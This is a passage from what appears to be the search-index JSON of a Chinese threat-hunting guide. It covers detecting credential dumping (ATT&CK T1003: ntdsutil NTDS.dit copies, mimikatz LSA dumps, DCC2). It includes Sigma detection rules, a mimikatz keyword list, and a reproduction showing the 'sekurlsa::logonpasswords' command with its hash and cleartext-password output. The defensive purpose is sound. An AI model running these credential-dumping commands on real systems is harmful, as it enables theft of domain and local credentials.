\u5e94\u7528\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_4","text":"windows \u5e94\u7528\u65e5\u5fd7\u7559\u75d5\u6587\u4ef6\uff1a https://github.com/12306Bro/Threathunting-book/blob/master/Eventdata/ntds.evtx","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#sigma","text":"title: \u5e94\u7528\u65e5\u5fd7\u68c0\u6d4bntdsutil\u83b7\u53d6NTDS.dit\u6587\u4ef6 description: windows server 2008 + AD\u57df\u63a7 references: https://blog.csdn.net/Fly_hps/article/details/80641987 tags: T1003-003 status: experimental author: 12306Bro logsource: product: windows service: application detection: selection1: EventID: 2005 Message: 'lsass (*) \u5377\u5f71\u590d\u5236\u5b9e\u4f8b * \u6b63\u5728\u542f\u52a8\u3002\u8fd9\u5c06\u662f\u4e00\u6b21\u5b8c\u6574\u7684\u5377\u5f71\u590d\u5236\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d selection2: EventID: 2001 Message: 'lsass (*) \u5377\u5f71\u526f\u672c\u5b9e\u4f8b * \u51bb\u7ed3\u5df2\u5f00\u59cb\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d selection3: EventID: 2003 Message: 'lsass (*) \u5377\u5f71\u526f\u672c\u5b9e\u4f8b * \u51bb\u7ed3\u5df2\u505c\u6b62\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d selection4: EventID: 2006 Message: 'lsass (*) \u5377\u5f71\u590d\u5236\u5b9e\u4f8b * \u5df2\u6210\u529f\u5b8c\u6210\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d selection5: EventID: 300 Message: lsass (*) \u6570\u636e\u5e93\u5f15\u64ce\u6b63\u5728\u521d\u59cb\u5316\u6062\u590d\u6b65\u9aa4\u3002 #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d selection6: EventID: 216 #\u671f\u95f4\u89e6\u53d1\u5927\u91cf216\u4e8b\u4ef6 Message: 'lsass (*) \u68c0\u6d4b\u5230\u6570\u636e\u5e93\u4f4d\u7f6e\u4ece\u201cC:\\Windows\\NTDS\\ntds.dit\u201d\u66f4\u6539\u4e3a\u201c\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy*1*\\Windows\\NTDS\\ntds.dit\u201d\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d selection7: EventID: 302 Message: 'lsass (*) \u6570\u636e\u5e93\u5f15\u64ce\u5df2\u6210\u529f\u5b8c\u6210\u6062\u590d\u6b65\u9aa4\u3002' #*\u53f7\u4ee3\u8868\u4efb\u610f\u6570\u503c\u5339\u914d \u200b timeframe: last 10S #\u81ea\u5b9a\u4e49\u65f6\u95f4\u8303\u56f4 condition: all of them level: medium","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_6","text":"\u6b64\u68c0\u6d4b\u7279\u5f81\u4ec5\u9002\u7528\u4e8ewindows AD\u57df\u63a7\u4e3b\u673a\u3002","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-003-win-%E5%9F%BA%E4%BA%8E%E5%BA%94%E7%94%A8%E6%97%A5%E5%BF%97%E6%A3%80%E6%B5%8BNtdsutil%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81/#_7","text":"MITRE-ATT&CK-T1003-003 https://attack.mitre.org/techniques/T1003/003 \u57df\u6e17\u900f\u2014\u2014\u83b7\u5f97\u57df\u63a7\u670d\u52a1\u5668\u7684NTDS.dit\u6587\u4ef6 https://xz.aliyun.com/t/2187 NTDS.dit\u5bc6\u7801\u5feb\u901f\u63d0\u53d6\u5de5\u5177 https://www.secpulse.com/archives/6301.html MITRE ATT&CK\u653b\u51fb\u77e5\u8bc6\u5e93\uff08\u4f01\u4e1a\uff09\u4e2d\u6587\u7248 https://hansight.github.io/#/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","text":"T1003-004-windows-\u57fa\u4e8eLSA\u51ed\u8bc1\u83b7\u53d6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5177\u6709SYSTEM\u8bbf\u95ee\u4e3b\u673a\u6743\u9650\u7684\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u8bbf\u95ee\u672c\u5730\u5b89\u5168\u673a\u6784\uff08LSA\uff09\u673a\u5bc6\uff0c\u5176\u4e2d\u53ef\u80fd\u5305\u542b\u5404\u79cd\u4e0d\u540c\u7684\u51ed\u636e\u6750\u6599\uff0c\u4f8b\u5982\u670d\u52a1\u5e10\u6237\u7684\u51ed\u636e\u3002LSA\u673a\u5bc6\u5b58\u50a8\u5728\u6ce8\u518c\u8868\u4e2dHKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets\u3002LSA\u673a\u5bc6\u4e5f\u53ef\u4ee5\u4ece\u5185\u5b58\u4e2d\u8f6c\u50a8\u3002 Reg\u53ef\u7528\u4e8e\u4ece\u6ce8\u518c\u8868\u4e2d\u63d0\u53d6\u3002Mimikatz\u53ef\u7528\u4e8e\u4ece\u5185\u5b58\u4e2d\u63d0\u53d6\u79d8\u5bc6\u3002 LSA\uff08Local Security Authority\uff09 \u901a\u8fc7system\u6743\u9650\u8bbf\u95ee\u4e3b\u673alsass.exe\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u4ece\u4e2d\u8bfb\u53d6\u672c\u5730\u767b\u5f55\u548c\u57df\u767b\u5f55\u7684\u660e\u6587\u5bc6\u7801\u3002\u5f53\u670d\u52a1\u5728\u672c\u5730\u6216\u57df\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u65f6\uff0c\u5176\u5bc6\u7801\u5b58\u50a8\u5728\u6ce8\u518c\u8868\u4e2d\u3002\u5982\u679c\u542f\u7528\u4e86\u81ea\u52a8\u767b\u5f55\uff0c\u5219\u6b64\u4fe1\u606f\u4e5f\u5c06\u5b58\u50a8\u5728\u6ce8\u518c\u8868\u4e2d\u3002 \u672c\u5730\u5b89\u5168\u673a\u6784\u5b50\u7cfb\u7edf\u670d\u52a1\uff08LSASS\uff09\u5904\u7406Windows\u4e3b\u673a\u4e2d\u5b89\u5168\u7b56\u7565\u7684\u5b9e\u65bd\u3002\u5728\u4ece2000\u5230Server 2008\u7684Windows\u73af\u5883\u4e2d\uff0cLSASS\u8fdb\u7a0b\u7684\u5185\u5b58\u4ee5\u660e\u6587\u5f62\u5f0f\u5b58\u50a8\u5bc6\u7801\u4ee5\u652f\u6301WDigest\u548cSSP\u8eab\u4efd\u9a8c\u8bc1\u3002\u56e0\u6b64\uff0cMimikatz\u7b49\u5de5\u5177\u53ef\u4ee5\u8f7b\u677e\u68c0\u7d22\u5bc6\u7801\u3002\u81eaWindows 8.1\u548cWindows Server 2012\u7684Microsoft\u4e3a\u4e86\u589e\u5f3a\u7cfb\u7edf\u7684\u5b89\u5168\u6027\uff0c\u8fdb\u4e00\u6b65\u963b\u6b62\u4e86LSASS\u4ee5\u660e\u6587\u5f62\u5f0f\u5b58\u50a8\u5bc6\u7801\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f60\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u5de5\u5177\u8fdb\u884c\u68c0\u7d22\u8bfb\u53d6SAM\u6587\u4ef6\uff1a pwdump.exe Mimikatz gsecdump \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 \u6216\u8005\uff0c\u53ef\u4ee5\u4f7f\u7528reg.exe\u4ece\u6ce8\u518c\u8868\u4e2d\u63d0\u53d6\u6587\u4ef6\uff0c\u5e76\u4f7f\u7528Creddump7\u6536\u96c6\u51ed\u636e\u3002 \u6ce8\u610f\uff1a\u7531\u673a\u5236\u95ee\u9898\u63d0\u53d6\u7684\u5bc6\u7801\u662fUTF-16\u7f16\u7801\u7684\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4eec\u4ee5\u660e\u6587\u5f62\u5f0f\u8fd4\u56de.Windows 10\u589e\u52a0\u4e86\u5bf9\u7f13\u89e3\u4e2d\u63cf\u8ff0\u7684LSA\u79d8\u5bc6\u7684\u4fdd\u62a4 \u68c0\u6d4b\u65e5\u5fd7 sysmon\u65e5\u5fd7 windows security\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u653b\u51fb\u65b9\u6cd5\uff1a\u4ecelsass.exe\u7a0b\u5e8f\u5185\u5b58\u4e2d\u8bfb\u53d6\u5bc6\u7801(administrator) C:\\mimikatz_trunk\\x64>mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" mimikatz(commandline) # privilege::debug Privilege '20' OK mimikatz(commandline) # sekurlsa::logonpasswords Authentication Id : 0 ; 246475 (00000000:0003c2cb) Session : RemoteInteractive from 2 User Name : 1.205 Domain : 1205-PC Logon Server : 1205-PC Logon Time : 2019/7/10 16:12:02 SID : S-1-5-21-4083414316-2806399370-2225847366-1000 msv : [00000003] Primary * Username : 1.205 * Domain : 1205-PC * LM : 6ce1432e9b83da8da8eed815a197bd87 * NTLM : 6136ba14352c8a09405bb14912797793 * SHA1 : b1ab7381d8e9799e407f1d4cb39e33b5d3e54f72 tspkg : * Username : 1.205 * Domain : 1205-PC * Password : 1qazcde3!@# wdigest : * Username : 1.205 * Domain : 1205-PC * Password : 1qazcde3!@# kerberos : * Username : 1.205 * Domain : 1205-PC * Password : 1qazcde3!@ ssp : credman : \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Mimikatz\u4f7f\u7528 description: \u68c0\u6d4b\u5e38\u89c1\u7684mimikatz\u547d\u4ee4\u53c2\u6570 tags: - attack.s0002 - attack.t1003 - attack.lateral_movement - attack.credential_access logsource: product: windows detection: keywords: Message: - \"* mimikatz *\" - \"* mimilib *\" - \"* <3 eo.oe *\" - \"* eo.oe.kiwi *\" - \"* privilege::debug *\" - \"* sekurlsa::logonpasswords *\" - \"* lsadump::sam *\" - \"* mimidrv.sys *\" - \"* p::d *\" - \"* s::l *\" condition: keywords falsepositives: - Naughty administrators - Penetration test level: critical \u5efa\u8bae \u5bf9\u6570\u636e\u6e90\u8981\u6c42\u8f83\u9ad8\uff0c\u53ef\u9002\u7528\u8303\u56f4\u4e3a\uff1a2012\u53ca\u4ee5\u4e0a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u9700\u8981\u5f00\u542f\u5ba1\u6838\u7b56\u7565\uff1b\u90e8\u7f72sysmon\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\uff0c\u8fdb\u7a0b\u521b\u5efa\u65e5\u5fd7\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1003-004 https://attack.mitre.org/techniques/T1003/004 pwdump7 http://passwords.openwall.net/b/pwdump/pwdump7.zip powershell https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1 mimikatz wiki https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump \u5173\u4e8e\u66f4\u591a\u8f6c\u50a8\u660e\u6587\u5bc6\u7801\u4f60\u53ef\u4ee5\u53c2\u8003 https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/","title":"T1003-004-windows-\u57fa\u4e8eLSA\u51ed\u8bc1\u83b7\u53d6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#t1003-004-windows-lsa","text":"","title":"T1003-004-windows-\u57fa\u4e8eLSA\u51ed\u8bc1\u83b7\u53d6"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","text":"\u5177\u6709SYSTEM\u8bbf\u95ee\u4e3b\u673a\u6743\u9650\u7684\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u8bbf\u95ee\u672c\u5730\u5b89\u5168\u673a\u6784\uff08LSA\uff09\u673a\u5bc6\uff0c\u5176\u4e2d\u53ef\u80fd\u5305\u542b\u5404\u79cd\u4e0d\u540c\u7684\u51ed\u636e\u6750\u6599\uff0c\u4f8b\u5982\u670d\u52a1\u5e10\u6237\u7684\u51ed\u636e\u3002LSA\u673a\u5bc6\u5b58\u50a8\u5728\u6ce8\u518c\u8868\u4e2dHKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets\u3002LSA\u673a\u5bc6\u4e5f\u53ef\u4ee5\u4ece\u5185\u5b58\u4e2d\u8f6c\u50a8\u3002 Reg\u53ef\u7528\u4e8e\u4ece\u6ce8\u518c\u8868\u4e2d\u63d0\u53d6\u3002Mimikatz\u53ef\u7528\u4e8e\u4ece\u5185\u5b58\u4e2d\u63d0\u53d6\u79d8\u5bc6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#lsalocal-security-authority","text":"\u901a\u8fc7system\u6743\u9650\u8bbf\u95ee\u4e3b\u673alsass.exe\u8fdb\u7a0b\uff0c\u53ef\u4ee5\u4ece\u4e2d\u8bfb\u53d6\u672c\u5730\u767b\u5f55\u548c\u57df\u767b\u5f55\u7684\u660e\u6587\u5bc6\u7801\u3002\u5f53\u670d\u52a1\u5728\u672c\u5730\u6216\u57df\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u65f6\uff0c\u5176\u5bc6\u7801\u5b58\u50a8\u5728\u6ce8\u518c\u8868\u4e2d\u3002\u5982\u679c\u542f\u7528\u4e86\u81ea\u52a8\u767b\u5f55\uff0c\u5219\u6b64\u4fe1\u606f\u4e5f\u5c06\u5b58\u50a8\u5728\u6ce8\u518c\u8868\u4e2d\u3002 \u672c\u5730\u5b89\u5168\u673a\u6784\u5b50\u7cfb\u7edf\u670d\u52a1\uff08LSASS\uff09\u5904\u7406Windows\u4e3b\u673a\u4e2d\u5b89\u5168\u7b56\u7565\u7684\u5b9e\u65bd\u3002\u5728\u4ece2000\u5230Server 2008\u7684Windows\u73af\u5883\u4e2d\uff0cLSASS\u8fdb\u7a0b\u7684\u5185\u5b58\u4ee5\u660e\u6587\u5f62\u5f0f\u5b58\u50a8\u5bc6\u7801\u4ee5\u652f\u6301WDigest\u548cSSP\u8eab\u4efd\u9a8c\u8bc1\u3002\u56e0\u6b64\uff0cMimikatz\u7b49\u5de5\u5177\u53ef\u4ee5\u8f7b\u677e\u68c0\u7d22\u5bc6\u7801\u3002\u81eaWindows 8.1\u548cWindows Server 2012\u7684Microsoft\u4e3a\u4e86\u589e\u5f3a\u7cfb\u7edf\u7684\u5b89\u5168\u6027\uff0c\u8fdb\u4e00\u6b65\u963b\u6b62\u4e86LSASS\u4ee5\u660e\u6587\u5f62\u5f0f\u5b58\u50a8\u5bc6\u7801\u3002","title":"LSA\uff08Local Security Authority\uff09"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","text":"\u4f60\u53ef\u4ee5\u4f7f\u7528\u8bb8\u591a\u5de5\u5177\u8fdb\u884c\u68c0\u7d22\u8bfb\u53d6SAM\u6587\u4ef6\uff1a pwdump.exe Mimikatz gsecdump \u00b7\u00b7\u00b7\u00b7\u00b7\u00b7 \u6216\u8005\uff0c\u53ef\u4ee5\u4f7f\u7528reg.exe\u4ece\u6ce8\u518c\u8868\u4e2d\u63d0\u53d6\u6587\u4ef6\uff0c\u5e76\u4f7f\u7528Creddump7\u6536\u96c6\u51ed\u636e\u3002 \u6ce8\u610f\uff1a\u7531\u673a\u5236\u95ee\u9898\u63d0\u53d6\u7684\u5bc6\u7801\u662fUTF-16\u7f16\u7801\u7684\uff0c\u8fd9\u610f\u5473\u7740\u5b83\u4eec\u4ee5\u660e\u6587\u5f62\u5f0f\u8fd4\u56de.Windows 10\u589e\u52a0\u4e86\u5bf9\u7f13\u89e3\u4e2d\u63cf\u8ff0\u7684LSA\u79d8\u5bc6\u7684\u4fdd\u62a4","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","text":"sysmon\u65e5\u5fd7 windows security\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#lsassexeadministrator","text":"C:\\mimikatz_trunk\\x64>mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" mimikatz(commandline) # privilege::debug Privilege '20' OK mimikatz(commandline) # sekurlsa::logonpasswords Authentication Id : 0 ; 246475 (00000000:0003c2cb) Session : RemoteInteractive from 2 User Name : 1.205 Domain : 1205-PC Logon Server : 1205-PC Logon Time : 2019/7/10 16:12:02 SID : S-1-5-21-4083414316-2806399370-2225847366-1000 msv : [00000003] Primary * Username : 1.205 * Domain : 1205-PC * LM : 6ce1432e9b83da8da8eed815a197bd87 * NTLM : 6136ba14352c8a09405bb14912797793 * SHA1 : b1ab7381d8e9799e407f1d4cb39e33b5d3e54f72 tspkg : * Username : 1.205 * Domain : 1205-PC * Password : 1qazcde3!@# wdigest : * Username : 1.205 * Domain : 1205-PC * Password : 1qazcde3!@# kerberos : * Username : 1.205 * Domain : 1205-PC * Password : 1qazcde3!@ ssp : credman :","title":"\u653b\u51fb\u65b9\u6cd5\uff1a\u4ecelsass.exe\u7a0b\u5e8f\u5185\u5b58\u4e2d\u8bfb\u53d6\u5bc6\u7801(administrator)"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","text":"title: Mimikatz\u4f7f\u7528 description: \u68c0\u6d4b\u5e38\u89c1\u7684mimikatz\u547d\u4ee4\u53c2\u6570 tags: - attack.s0002 - attack.t1003 - attack.lateral_movement - attack.credential_access logsource: product: windows detection: keywords: Message: - \"* mimikatz *\" - \"* mimilib *\" - \"* <3 eo.oe *\" - \"* eo.oe.kiwi *\" - \"* privilege::debug *\" - \"* sekurlsa::logonpasswords *\" - \"* lsadump::sam *\" - \"* mimidrv.sys *\" - \"* p::d *\" - \"* s::l *\" condition: keywords falsepositives: - Naughty administrators - Penetration test level: critical","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","text":"\u5bf9\u6570\u636e\u6e90\u8981\u6c42\u8f83\u9ad8\uff0c\u53ef\u9002\u7528\u8303\u56f4\u4e3a\uff1a2012\u53ca\u4ee5\u4e0a\u64cd\u4f5c\u7cfb\u7edf\uff0c\u9700\u8981\u5f00\u542f\u5ba1\u6838\u7b56\u7565\uff1b\u90e8\u7f72sysmon\u7684Windows\u64cd\u4f5c\u7cfb\u7edf\uff0c\u8fdb\u7a0b\u521b\u5efa\u65e5\u5fd7\u3002","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-004-win-LSA-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","text":"MITRE-ATT&CK-T1003-004 https://attack.mitre.org/techniques/T1003/004 pwdump7 http://passwords.openwall.net/b/pwdump/pwdump7.zip powershell https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1 mimikatz wiki https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump \u5173\u4e8e\u66f4\u591a\u8f6c\u50a8\u660e\u6587\u5bc6\u7801\u4f60\u53ef\u4ee5\u53c2\u8003 https://pentestlab.blog/2018/04/04/dumping-clear-text-credentials/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1003-005-win-DCC2-mimikatz%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","text":"T1003-005-win-DCC2-mimikatz\u51ed\u8bc1\u83b7\u53d6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u8bbf\u95ee\u7f13\u5b58\u7684\u57df\u51ed\u636e\uff0c\u8be5\u51ed\u636e\u7528\u4e8e\u5728\u57df\u63a7\u5236\u5668\u4e0d\u53ef\u7528\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u5728Windows Vista\u53ca\u66f4\u9ad8\u7248\u672c\u4e0a\uff0c\u54c8\u5e0c\u683c\u5f0f\u4e3aDCC2\uff08\u57df\u7f13\u5b58\u51ed\u636e\u7248\u672c2\uff09\u54c8\u5e0c\uff0c\u4e5f\u79f0\u4e3aMS-Cache v2\u54c8\u5e0c\u3002\u9ed8\u8ba4\u7f13\u5b58\u51ed\u636e\u7684\u6570\u91cf\u5404\u4e0d\u76f8\u540c\uff0c\u5e76\u4e14\u6bcf\u4e2a\u7cfb\u7edf\u90fd\u53ef\u4ee5\u66f4\u6539\u3002\u8be5\u6563\u5217\u4e0d\u5141\u8bb8\u901a\u8fc7\u6563\u5217\u6837\u5f0f\u7684\u653b\u51fb\uff0c\u800c\u662f\u9700\u8981\u4f7f\u7528\u5bc6\u7801\u7834\u89e3\u6765\u6062\u590d\u7eaf\u6587\u672c\u5bc6\u7801\u3002 \u901a\u8fc7SYSTEM\u8bbf\u95ee\uff0c\u53ef\u4ee5\u4f7f\u7528\u8bf8\u5982Mimikatz\uff0cReg\u548csecretsdump.py\u4e4b\u7c7b\u7684\u5de5\u5177/\u5b9e\u7528\u7a0b\u5e8f\u6765\u63d0\u53d6\u7f13\u5b58\u7684\u51ed\u636e\u3002 \u6ce8\u610f\uff1aWindows Vista\u7684\u7f13\u5b58\u51ed\u636e\u662f\u4f7f\u7528PBKDF2\u6d3e\u751f\u7684 DCC2\uff08Domain Cached Credentials version 2\uff09 Domain Cached Credentials \u7b80\u79f0 DDC\u57df\u7f13\u5b58\u51ed\u636e\uff0c\u662f\u7f13\u5b58\u7684\u57df\u767b\u5f55\u4fe1\u606f\uff0c\u8fd9\u4e9b\u4fe1\u606f\u672c\u5730\u5b58\u50a8\u5728Windows\u64cd\u4f5c\u7cfb\u7edf\u7684windows\u6ce8\u518c\u8868\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u952e\u4e2d\u7684regedit\uff08\u4ee5SYSTEM\u7279\u6743\u8fd0\u884c\uff09\u6765\u67e5\u770b\u3002 HKEY_LOCAL_MACHINE\\SECURITY\\Cache \u968f\u7740Windows Vista\u64cd\u4f5c\u7cfb\u7edf\u7684\u53d1\u5e03\uff0cMicrosoft\u5f15\u5165\u4e86\u4e00\u79cd\u65b0\u7684\u54c8\u5e0c\u7b97\u6cd5\u6765\u751f\u6210\u8fd9\u4e9b\u57df\u7f13\u5b58\u7684\u51ed\u636e\u3002\u8fd9\u79cd\u65b0\u7b97\u6cd5\uff08\u5373DCC2\uff09\u5c06\u5bc6\u7801\u731c\u6d4b\u653b\u51fb\u7684\u6210\u672c\u63d0\u9ad8\u4e86\u51e0\u4e2a\u6570\u91cf\u7ea7\u3002 DCC2\uff08\u57df\u7f13\u5b58\u51ed\u636e\u7248\u672c2\uff09\uff0cWindows Vista\u548c\u66f4\u65b0\u7248\u672c\u7684\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\u6b64\u7b97\u6cd5\u6765\u7f13\u5b58\u548c\u9a8c\u8bc1\u76f8\u5173\u670d\u52a1\u5668\uff08\u57df\u63a7\uff09\u4e0d\u53ef\u7528\u65f6\u7684\u8fdc\u7a0b\u51ed\u636e\u3002\u5b83\u6709\u8bb8\u591a\u5176\u4ed6\u540d\u79f0\uff0c\u5305\u62ec\u201c mscache2\u201d\u548c\u201c mscash2\u201d\uff08Microsoft CAched haSH\uff09\u3002\u5b83\u53d6\u4ee3\u4e86Windows \u65e9\u671f\u7248\u672c\u4e2d\u4f7f\u7528\u7684\u8f83\u5f31\u7684msdcc v1\u54c8\u5e0c\u3002\u4ece\u5b89\u5168\u89d2\u5ea6\u6765\u770b\uff0c\u5b83\u5e76\u4e0d\u662f\u7279\u522b\u5f31\uff0c\u4f46\u662f\u7531\u4e8e\u5b83\u4f7f\u7528\u4e86\u7528\u6237\u540d\u4f5c\u4e3a\u76d0\uff0c\u56e0\u6b64\u9664\u4e86\u9a8c\u8bc1\u73b0\u6709\u7684\u7f13\u5b58\u51ed\u636e\u4e4b\u5916\uff0c\u4e0d\u5e94\u5c06\u5176\u7528\u4e8e\u4efb\u4f55\u5176\u4ed6\u7528\u9014\u3002\u7b80\u5355\u6765\u8bf4\uff1a\u5b83\u662f\u7f13\u5b58\u5728\u64cd\u4f5c\u7cfb\u7edf\u672c\u5730\u6ce8\u518c\u8868\u4e2d\u7684\u57df\u51ed\u636e+\u57df\u6388\u6743\u4fe1\u606f\uff0c\u540e\u9762\u7b80\u79f0\u6388\u6743\u51ed\u636e\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff1a\u4f60\u7684\u4e2a\u4eba\u529e\u516c\u7535\u8111\u52a0\u5165\u4e86\u516c\u53f8\u7684\u529e\u516c\u57df\uff0c\u4f60\u4e00\u76f4\u4f7f\u7528\u57df\u8d26\u6237\u8fdb\u884c\u767b\u5f55\uff0c\u800c\u4e0d\u662f\u672c\u5730\u8d26\u6237\u767b\u5f55\u3002\u4f60\u5229\u7528\u57df\u8d26\u6237\u767b\u5f55\u65f6\u6240\u8f93\u5165\u7684\u8d26\u6237\u5bc6\u7801\u7531\u57df\u63a7\u8fdb\u884c\u9a8c\u8bc1\uff0c\u5f53\u57df\u63a7\u9a8c\u8bc1\u6210\u529f\u540e\u4f60\u53ef\u4ee5\u767b\u5f55\u8fd9\u53f0\u529e\u516c\u7535\u8111\uff1b\u4f46\u5f53\u4f60\u7684\u4e2a\u4eba\u529e\u516c\u7535\u8111\u5904\u4e8e\u65ad\u7f51\u6216\u8005\u5728\u5176\u4ed6\u5730\u65b9\u529e\u516c\uff08\u975e\u516c\u53f8\u529e\u516c\u57df\u73af\u5883\uff09\u65f6\uff0c\u4f60\u4f9d\u7136\u53ef\u4ee5\u4f7f\